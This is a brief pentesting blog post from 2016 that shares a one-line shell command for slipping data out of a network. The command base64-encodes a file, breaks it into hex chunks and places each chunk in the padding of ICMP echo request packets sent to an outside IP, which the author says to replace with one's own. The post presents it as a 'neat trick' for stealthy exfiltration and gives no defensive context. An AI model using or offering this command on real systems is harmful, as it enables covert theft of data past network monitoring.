Title: Data Exfiltration with Ping
Date: 2016-07-01 10:21
Category: Pentesting
Tags: ping, stealth, exfil, data
Slug: ping-exfil
Authors: wumb0

I was looking around Twitter the other day and someone had posted something similar to this. I don't remember who you are, but this is a neat trick so I wanted to share it. How to exfiltrate data from a network using the padding of ICMP echo request packets. 

<pre><code class="sh">
base64 important-data.txt | xxd -ps -c 16 | while read i; do ping -c1 -s32 -p $i 8.8.8.8; done
</code></pre>

This will base64 encode important-data.txt and then stuff the encoded data 16 bytes at a time into ping. 

Obviously you should change the IP before sending :)

That's all for now.
